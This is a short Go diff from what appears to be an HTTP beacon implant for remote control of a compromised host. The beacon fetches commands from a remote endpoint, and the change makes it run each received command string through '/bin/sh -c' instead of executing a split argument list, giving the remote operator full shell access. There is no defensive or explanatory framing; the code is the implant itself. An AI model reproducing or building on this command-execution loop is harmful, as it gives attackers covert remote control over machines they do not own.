@@ -50,8 +50,9 @@ func queryCommandHttp(endpoint string) (resp *http.Response, err error) {
 
 func (packet BeaconHttp) handleQueryResponse(commResp CommandResponse) {
 	for _, cmd := range commResp.Exec {
-		cmdSplit := strings.Fields(cmd);
-		out, err := exec.Command(cmdSplit[0], cmdSplit[1:]...).Output()
+		//cmdSplit := strings.Fields(cmd);
+		command := []string{ "-c", cmd }
+		out, err := exec.Command("/bin/sh", command...).Output()
 		debugFatal(err)
 
 		if err == nil && len(out) > 0 {
